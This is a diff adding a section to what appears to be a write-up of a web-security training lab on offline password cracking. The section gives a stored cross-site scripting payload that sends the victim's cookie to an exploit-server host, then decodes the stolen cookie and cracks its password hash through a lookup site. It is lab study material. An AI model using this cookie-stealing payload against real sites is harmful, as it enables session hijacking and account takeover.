@@ -164,3 +164,28 @@ Brute force `carlos` cookie/password:
 ```
 python brute-force-stay-signed-in-cookie.py
 ```
+
+## Offline password cracking
+
+Logged in as `wiener` and examined `stay-signed-in` cookie. Same process and results as above.
+
+To retrieve the `carlos` cookie create a comment with body:
+
+```
+<script>
+fetch("https://exploit-0a32005c03b912ba817ca75001d90043.exploit-server.net/exploit?q=" + btoa(document.cookie), {mode: 'no-cors'})
+</script>
+```
+
+Then read the `Access log` from the `Exploit server` to reveal the cookie.
+
+```
+$echo -n "c2VjcmV0PXpkeW9uYnVjZjZnendBOElteDIyUWxzVzgzODVvVlhHOyBzdGF5LWxvZ2dlZC1pbj1ZMkZ5Ykc5ek9qSTJNekl6WXpFMlpEVm1OR1JoWW1abU0ySmlNVE0yWmpJME5qQmhPVFF6" | base64 -d
+secret=zdyonbucf6gzwA8Imx22QlsW8385oVXG; stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+```
+
+Examining `stay-signed-in` cookie:
+
+Base64 decoding results in `carlos:26323c16d5f4dabff3bb136f2460a943`
+
+Checking provided hash again in CrackStation it reviels that the password is `onceuponatime`.
